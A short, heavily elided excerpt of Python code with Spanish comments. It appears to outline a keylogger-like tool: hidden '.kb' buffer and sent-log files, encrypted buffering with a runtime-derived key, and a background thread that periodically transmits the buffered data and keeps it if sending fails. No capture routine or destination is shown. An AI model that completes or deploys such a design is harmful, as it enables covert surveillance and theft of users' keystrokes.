...
# Clave derivada en runtime, no embebida directamente
...
BUFFER_FILE = LOG_DIR / ".kb_buf.enc"
SENT_LOG    = LOG_DIR / ".kb_sent.log"
...
def encrypt_data(plaintext: bytes, key: bytes) -> bytes:
    ...
    aesgcm = AESGCM(key)
    nonce  = os.urandom(12)  # nonce aleatorio por mensaje
...
class SecureBuffer:
    ...
    def drain_disk(self) -> bytes | None:
        ...
        self._buf_file.unlink(missing_ok=True)
...
class PeriodicSender(threading.Thread):
    ...
    def _do_send_cycle(self):
        ...
        if not success:
            # guardar de vuelta si falló la transmisión
